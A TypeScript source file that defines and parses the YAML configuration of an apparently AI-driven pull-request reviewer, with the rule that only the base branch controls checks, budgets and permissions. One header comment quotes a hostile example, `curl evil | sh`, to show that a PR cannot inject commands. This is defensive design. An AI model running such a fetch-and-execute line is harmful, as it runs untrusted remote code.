import { z } from "zod"
import type { GitRun } from "./context"
import type { ReviewEngineConfig } from "./engine"
import { BacklogConfig } from "./backlog"
import { LANGUAGE_NAME, REVIEW_LANGUAGE } from "./language"
import { isPresetName, overlay, presetLayer, REVIEW_PRESETS } from "./presets"
import { LOGIN_PATTERNS, type RegistryForge } from "./registry"

/**
 * The repository's reviewer settings, `.mendcode/review.yaml`, and its learnings, `.mendcode/review-learnings.md` (docs/pr-review.md).
 * Both are versioned files of the repository, read with `git show`, never a vendor's memory. The base branch decides what a pull
 * request cannot decide for itself: whether the reviewer runs, the checks it may run, the budget and what it ignores. A PR's own
 * config may only add path instructions, so `checks: [curl evil | sh]` in a PR never runs. YAML is `Bun.YAML` (no dependency).
 */

export const CONFIG_PATH = ".mendcode/review.yaml"
export const LEARNINGS_PATH = ".mendcode/review-learnings.md"
export const LEARNINGS_LIMIT = 4096
const CONFIG_LIMIT = 64 * 1024

const glob = z.string().min(1).max(300)
/**
 * A login in `reviewers` or `publishers`: any supported forge's username syntax (registry.ts `LOGIN_PATTERNS`; a GitLab or Gitea
 * username may hold `.` and `_`). Read with the checkout's forge (`parseReviewConfig`), each is held to that forge's own syntax.
 */
const Login = z.string().max(255).refine((value) => Object.values(LOGIN_PATTERNS).some((entry) => entry.pattern.test(value)), "a login (letters, digits, '-', and on GitLab or Gitea '_' and '.')")
/** The review prose's language when the repository names none (`template.language`), and the `auto` value (language.ts). */
export { AUTO_LANGUAGE, REVIEW_LANGUAGE } from "./language"
export const ReviewConfig = z.strictObject({
  /** The preset the file starts from (presets.ts): its values sit under every key the file sets itself. Unset: `balanced`, the defaults below. */
  preset: z.enum(REVIEW_PRESETS).optional(),
  enabled: z.boolean().default(false),
  profile: z.enum(["quiet", "normal", "strict"]).default("normal"),
  cap: z.number().int().min(1).max(30).default(8),
  /**
   * The lowest verifier score (0 to 10, from the verify pass that already judges each finding) a finding may have to be published.
   * 0 publishes everything the verdict allows, as before; a finding the verifier gave no score is never dropped by this. Scores
   * also order the findings within a severity before `cap` cuts them.
   */
  min_score: z.number().int().min(0).max(10).default(0),
  /**
   * Models tried, in order, when the reviewer's own model fails with a provider error or is not available (never for a quota or
   * rate limit: `budget.on_quota` decides those). Each must be allowed in the user's model list and on the reviewer's own
   * provider; one that is not is skipped with a note. Empty: no fallback. Base branch only.
   */
  fallback_models: z.array(z.string().min(1).max(160)).max(5).default([]),
  paths: z.array(z.strictObject({ glob, instructions: z.string().min(1).max(2000) })).max(50).default([]),
  ignore: z.array(glob).max(100).default([]),
  checks: z.array(z.string().min(1).max(500)).max(8).default([]),
  /** `@mendcode fix` may push a commit to the PR branch (still only for a commenter with write access). */
  fixes: z.boolean().default(false),
  triggers: z.strictObject({ opened: z.boolean().default(true), synchronize: z.boolean().default(true), ready_for_review: z.boolean().default(true), drafts: z.boolean().default(false) }).default({ opened: true, synchronize: true, ready_for_review: true, drafts: false }),
  /**
   * Model work per pull request (docs/pr-review.md, budgets). `tokens_per_pr` counts input (less what the provider served from
   * its cache) plus output across the review, verify, fix and resumed rounds of one PR head; `null` is no internal cap. It is not
   * the context window: `context_tokens` bounds what one call carries (unset: from the model's window). At the cap or at a real
   * quota the job checkpoints with its candidates kept; `on_quota` says whether it waits for the reset (`wait`) or stops (`stop`).
   * `tokens_per_diff_token` scales the cap with the change: a review of a small diff is held to a fixed base plus that many tokens
   * per token of diff, never above `tokens_per_pr`; 0 holds every review to `tokens_per_pr` alone.
   */
  budget: z.strictObject({
    tokens_per_pr: z.number().int().min(10_000).max(1_000_000_000).nullable().default(1_000_000),
    tokens_per_diff_token: z.number().min(0).max(1_000).default(8),
    context_tokens: z.number().int().min(8_000).max(2_000_000).optional(),
    on_quota: z.enum(["wait", "stop"]).default("wait"),
    max_wait_minutes: z.number().int().min(1).max(10_080).default(360),
  }).default({ tokens_per_pr: 1_000_000, tokens_per_diff_token: 8, on_quota: "wait", max_wait_minutes: 360 }),
  /**
   * Which pull requests start a review by themselves: `auto` on the triggers, `on-request` only when asked (`@mendcode review`, a
   * requested reviewer, `/pr review`), `labels` only with a label in `filters.labels.include`. Filters narrow every mode.
   */
  mode: z.enum(["auto", "on-request", "labels"]).default("auto"),
  filters: z.strictObject({
    labels: z.strictObject({ include: z.array(z.string().min(1).max(100)).max(50).default([]), exclude: z.array(z.string().min(1).max(100)).max(50).default([]) }).default({ include: [], exclude: [] }),
    /** Globs of the base branch. */
    branches: z.strictObject({ include: z.array(glob).max(50).default([]), exclude: z.array(glob).max(50).default([]) }).default({ include: [], exclude: [] }),
    authors: z.strictObject({ include: z.array(z.string().min(1).max(100)).max(100).default([]), exclude: z.array(z.string().min(1).max(100)).max(100).default([]), bots: z.boolean().default(false) }).default({ include: [], exclude: [], bots: false }),
    /** Only PRs that touch one of these globs. */
    paths: z.array(glob).max(50).default([]),
  }).default({ labels: { include: [], exclude: [] }, branches: { include: [], exclude: [] }, authors: { include: [], exclude: [], bots: false }, paths: [] }),
  /** After the first review of a PR: only the new commits (`incremental`) or the whole PR again (`full`). An audit of the repository is only ever explicit. */
  coverage: z.enum(["incremental", "full"]).default("incremental"),
  /**
   * What a reviewer may do after a review: `review` only, `fix-once` (one fix of the confirmed findings), `fix-loop` (fix, review
   * again, until no confirmed finding is open, no progress is made or `max_rounds`). `push` lets the fix go to the PR branch
   * (never a force push, never a merge); `personal` lets a developer's own reviewer do it on PRs routed to them.
   */
  fix: z.strictObject({
    mode: z.enum(["review", "fix-once", "fix-loop"]).default("review"),
    push: z.boolean().default(false),
    personal: z.boolean().default(false),
    max_rounds: z.number().int().min(1).max(20).default(3),
  }).default({ mode: "review", push: false, personal: false, max_rounds: 3 }),
  /**
   * The stages a review goes through: `none` (one pass and the verify, no visible stages), `fixed` (the `list` as given) or
   * `dynamic` (the list, plus stages chosen from the change's size, paths and risk, each with its reason). Ids are free text.
   */
  phases: z.strictObject({
    mode: z.enum(["none", "fixed", "dynamic"]).default("dynamic"),
    list: z.array(z.strictObject({
      id: z.string().regex(/^[a-z][a-z0-9-]{0,39}$/),
      enabled: z.boolean().default(true),
      prompt: z.string().min(1).max(2000).optional(),
      when: z.strictObject({ paths: z.array(glob).max(20).optional(), min_lines: z.number().int().min(0).optional(), risk: z.enum(["low", "medium", "high"]).optional() }).optional(),
    })).max(20).default([]),
    max_rounds_without_progress: z.number().int().min(1).max(10).default(2),
  }).default({ mode: "dynamic", list: [], max_rounds_without_progress: 2 }),
  /**
   * The review's Markdown: sections in this order, each on or off, with an optional title and a prompt for what it says. Empty: the
   * built-in layout. `language`: the language of the reviewer's prose (summary, walkthrough, findings, checks, sections), pinned in
   * the review and verify prompts whatever the PR, the code or the user's own harness settings use; the template's labels stay
   * English. `auto`: the language of the PR's author, judged once per PR from its title and description (English when short, empty or
   * unclear) and kept with the PR's review state (language.ts). Only the repository sets it, so every review of a PR reads in one language.
   */
  template: z.strictObject({
    sections: z.array(z.strictObject({ id: z.string().regex(/^[a-z][a-z0-9-]{0,39}$/), enabled: z.boolean().default(true), title: z.string().min(1).max(120).optional(), prompt: z.string().min(1).max(2000).optional() })).max(20).default([]),
    tone: z.enum(["neutral", "concise", "detailed"]).default("neutral"),
    language: z.string().regex(LANGUAGE_NAME, "a language name, such as English or Português, or auto").default(REVIEW_LANGUAGE),
  }).default({ sections: [], tone: "neutral", language: REVIEW_LANGUAGE }),
  /** Automatic reviews only: a PR again after `pr_minutes` (once, at its newest head), at most `repo_per_hour` per repository. `/pr review` is not limited. */
  cooldown: z.strictObject({ pr_minutes: z.number().int().min(0).max(1440).default(10), repo_per_hour: z.number().int().min(1).max(500).default(20) }).default({ pr_minutes: 10, repo_per_hour: 20 }),
  /**
   * Whose PRs a watching reviewer takes: `all`, or `requested` (a review requested from, or the PR assigned to, the reviewer's gh
   * login). `/pr watch-repo all|requested` overrides it per watch. A list of logins is the team that may ask: only their
   * `@mendcode` comments are taken, and PRs are taken as with `all` (`reviewRole`, `requestersOf`).
   */
  reviewers: z.union([z.enum(["all", "requested"]), z.array(Login).min(1).max(100)]).default("all"),
  /**
   * Whose reviewer may post here (publishers.ts): `maintainers`, a gh login with write access; a list of logins (contributors
   * included); or `anyone`. A reviewer that may not post keeps its reviews in its session and answers no `@mendcode` comment.
   */
  publishers: z.union([z.enum(["maintainers", "anyone"]), z.array(Login).min(1).max(100)]).default("maintainers"),
  /**
   * When a watch starts, and at each catch-up (a daemon start, a resume): at most `max_prs` open pull requests updated in the last
   * `window_days` with no review of their current head yet are reviewed, newest first (backlog.ts); `max_prs: 0` reviews none of
   * them (they are the baseline). Base branch only.
   */
  backlog: BacklogConfig,
  /**
   * What `@mendcode describe` and `@mendcode approve` may do beyond writing the description's MendCode section: `describe_title` lets
   * describe also replace the pull request's title, `approve` lets `@mendcode approve` submit an approval. Both are off: only the
   * repository sets them (base branch).
   */
  commands: z.strictObject({ describe_title: z.boolean().default(false), approve: z.boolean().default(false) }).default({ describe_title: false, approve: false }),
  /**
   * A publishing review sets the `MendCode review` commit status on the PR head (commit-status.ts): pending while it runs, then
   * success, failure (a critical or major finding open) or error (stopped). `false` sets none. Base branch only.
   */
  status: z.boolean().default(true),
  /**
   * Data and generated files (triage.ts) go to readers on a cheap model instead of the review pass whole (readers.ts). `parallel`:
   * readers at once (unset: by the install tier, minimalist 1, balanced 2, full 3). `model`: a cheap model of the reviewer's own
   * provider (reader-models.ts); one off that list is refused with a note and the automatic pick is used. `enabled: false` sends
   * every diff to the review pass as before.
   */
  readers: z.strictObject({
    enabled: z.boolean().default(true),
    parallel: z.number().int().min(1).max(8).optional(),
    model: z.string().min(1).max(160).optional(),
  }).default({ enabled: true }),
})
export type ReviewConfig = z.infer<typeof ReviewConfig>
export const DEFAULT_REVIEW_CONFIG: ReviewConfig = ReviewConfig.parse({})

/** Which PRs a watching reviewer takes: a `reviewers` list restricts who asks, not whose PRs, so it reviews as `all`. */
export const reviewRole = (rule: ReviewConfig["reviewers"]): "all" | "requested" => Array.isArray(rule) ? "all" : rule
/** The logins whose `@mendcode` comments are taken, or undefined when anyone's are (still only answered with write access). */
export const requestersOf = (rule: ReviewConfig["reviewers"]): readonly string[] | undefined => Array.isArray(rule) ? rule : undefined
/** Whether `actor` may ask this repository's reviewer for anything (`reviewers` as a list). */
export const mayRequest = (rule: ReviewConfig["reviewers"], actor: string) => { const team = requestersOf(rule); return !team || team.some((login) => login.toLowerCase() === actor.toLowerCase()) }

/** The first line from which no longer prefix parses: where Bun's YAML error (which names no line) went wrong. */
function errorLine(text: string): number {
  const lines = text.split("\n").slice(0, 2000)
  let line = lines.length
  for (let end = lines.length; end >= 1; end--) {
    try { Bun.YAML.parse(lines.slice(0, end).join("\n")); break } catch { line = end }
  }
  return line
}

export type ParsedConfig = { config: ReviewConfig; problem?: string }

/**
 * A file's own keys over its preset's (`preset: quiet` and `cap: 12` gives quiet's values with a cap of 12). A value that is not an
 * object, or a preset that is not a name, is left for the schema to report.
 */
export function withPreset(raw: unknown): unknown {
  if (!raw || typeof raw !== "object" || Array.isArray(raw)) return raw
  const name = (raw as Record<string, unknown>).preset
  return isPresetName(name) ? overlay(presetLayer(name), raw) : raw
}

/** The first login of `reviewers` or `publishers` that `forge` cannot have, as a problem's field and text. */
function foreignLogin(config: ReviewConfig, forge: RegistryForge): string | undefined {
  for (const key of ["reviewers", "publishers"] as const) {
    const rule = config[key]
    if (!Array.isArray(rule)) continue
    const at = rule.findIndex((login) => !LOGIN_PATTERNS[forge].pattern.test(login))
    if (at >= 0) return `${key}.${at}: ${JSON.stringify(rule[at]!.slice(0, 60))} is not ${LOGIN_PATTERNS[forge].text}`
  }
  return undefined
}

/**
 * One YAML text as a config with defaults; a problem names the line or field and the defaults are used. `forge`, the checkout's
 * (when the caller knows it), holds the logins of `reviewers` and `publishers` to its username syntax; unset, any forge's is taken.
 */
export function parseReviewConfig(text: string | undefined, forge?: RegistryForge | undefined): ParsedConfig {
  if (text === undefined || !text.trim()) return { config: DEFAULT_REVIEW_CONFIG }
  if (text.length > CONFIG_LIMIT) return { config: DEFAULT_REVIEW_CONFIG, problem: `[PR_REVIEW]: ${CONFIG_PATH} is larger than ${CONFIG_LIMIT / 1024} KB; defaults used` }
  let raw: unknown
  try { raw = Bun.YAML.parse(text) } catch (error) {
    return { config: DEFAULT_REVIEW_CONFIG, problem: `[PR_REVIEW]: config line ${errorLine(text)}: ${error instanceof Error ? error.message.replace(/^YAML Parse error:\s*/, "") : "invalid YAML"}; defaults used` }
  }
  const parsed = ReviewConfig.safeParse(withPreset(raw ?? {}))
  if (parsed.success) {
    const foreign = forge ? foreignLogin(parsed.data, forge) : undefined
    return foreign ? { config: DEFAULT_REVIEW_CONFIG, problem: `[PR_REVIEW]: config ${foreign}; defaults used` } : { config: parsed.data }
  }
  const issue = parsed.error.issues[0]!
  return { config: DEFAULT_REVIEW_CONFIG, problem: `[PR_REVIEW]: config ${issue.path.join(".") || "root"}: ${issue.message}; defaults used` }
}

/** Base controls `enabled`, `checks`, `budget`, `ignore`, `profile`, `cap`, `min_score`, `fallback_models`, `fixes`, the triggers, the cooldown, `reviewers`, `publishers`, `backlog` and `template.language`; the head may only add path instructions. */
export function mergeReviewConfigs(base: ReviewConfig, head: ReviewConfig): ReviewConfig {
  const known = new Set(base.paths.map((entry) => `${entry.glob}\n${entry.instructions}`))
  return { ...base, paths: [...base.paths, ...head.paths.filter((entry) => !known.has(`${entry.glob}\n${entry.instructions}`))].slice(0, 50) }
}

/** Learnings cut at a bullet boundary to `LEARNINGS_LIMIT` bytes; a bullet alone over the limit is left out. */
export function boundLearnings(text: string): string {
  const bullets = text.split("\n").reduce<string[]>((all, line) => {
    if (/^\s*[-*]\s+/.test(line) || !all.length) all.push(line)
    else all[all.length - 1] += `\n${line}`
    return all
  }, []).map((bullet) => bullet.trimEnd()).filter((bullet) => bullet.trim())
  const kept: string[] = []
  let bytes = 0
  for (const bullet of bullets) {
    const size = Buffer.byteLength(bullet) + 1
    if (bytes + size > LEARNINGS_LIMIT) break
    kept.push(bullet)
    bytes += size
  }
  return kept.join("\n")
}

const matches = (pattern: string, file: string) => { try { return new Bun.Glob(pattern).match(file) } catch { return false } }
export const ignoredBy = (config: ReviewConfig) => (file: string) => config.ignore.some((pattern) => matches(pattern, file))

/** The engine's view of a config for one diff: only the path instructions whose glob matches a file the diff changes. */
export function promptConfig(config: ReviewConfig, files: readonly string[], learnings: string): ReviewEngineConfig {
  return { profile: config.profile, instructions: config.paths.filter((entry) => files.some((file) => matches(entry.glob, file))), learnings, budgetTokens: config.budget.tokens_per_pr ?? Number.POSITIVE_INFINITY, minScore: config.min_score }
}

const show = async (git: GitRun, directory: string, ref: string, file: string) => {
  const done = await git(["show", `${ref}:${file}`], directory)
  return done.code === 0 ? done.out : undefined
}

/**
 * The config of a pull request: base and head read from git, merged by `mergeReviewConfigs`, the learnings from the base (a PR
 * cannot teach the reviewer to ignore its own bugs; `@mendcode learn` proposes them as a commit that counts once merged). Problems
 * go to `notes` for the review summary.
 */
export async function readReviewConfig({ directory, base, head, git, forge }: { directory: string; base: string; head: string; git: GitRun; forge?: RegistryForge | undefined }): Promise<{ config: ReviewConfig; learnings: string; notes: string[] }> {
  const [baseText, headText, learnings] = await Promise.all([show(git, directory, base, CONFIG_PATH), show(git, directory, head, CONFIG_PATH), show(git, directory, base, LEARNINGS_PATH)])
  const fromBase = parseReviewConfig(baseText, forge)
  const fromHead = parseReviewConfig(headText, forge)
  const notes = [fromBase.problem, fromHead.problem && fromHead.problem.replace("defaults used", "the base branch's config used")].filter((note): note is string => !!note)
  return { config: mergeReviewConfigs(fromBase.config, fromHead.problem ? DEFAULT_REVIEW_CONFIG : fromHead.config), learnings: boundLearnings(learnings ?? ""), notes }
}
